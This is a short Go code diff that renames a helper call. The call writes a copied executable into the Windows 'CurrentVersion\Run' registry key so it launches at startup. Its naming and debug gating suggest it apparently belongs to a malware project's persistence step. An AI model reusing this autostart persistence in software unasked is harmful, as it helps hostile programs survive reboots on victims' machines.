@@ -75,7 +75,7 @@ func main() {
 	}
 
 	if !config.Debugging && config.AddToStartup {
-		err := utils.SetRegistry(
+		err := utils.SetRegistryVal(
 			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
 			config.HypothermiaName,
 			fmt.Sprintf("\"%s\" %s", newPath, config.Verifier),
